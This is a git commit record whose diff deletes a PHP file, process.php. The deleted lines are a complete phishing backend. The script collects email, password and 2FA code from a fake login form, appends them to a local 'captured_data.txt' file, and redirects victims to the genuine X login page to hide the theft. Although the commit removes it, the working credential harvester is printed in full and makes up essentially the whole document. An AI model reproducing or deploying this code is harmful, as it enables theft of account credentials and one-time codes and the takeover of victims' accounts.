7077cd8b1209208fc7d68a8011f0b38f288e8e56
duse1532-tech <duse1532@gmail.com>
2026-02-04 07:42:39 -0500

    Update process.php

--- process.php
+++ process.php
@@ -1,15 +1,1 @@
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $email = $_POST['email'];
-    $password = $_POST['password'];
-    $twoFaCode = $_POST['2fa_code'];
 
-    // Store data in a local file
-    $data = "Email: $email\nPassword: $password\n2FA Code: $twoFaCode\n\n";
-    file_put_contents('captured_data.txt', $data, FILE_APPEND);
-
-    // Redirect to a thank you page or the original X login page
-    header("Location: https://x.com/login");
-    exit();
-}
-?>
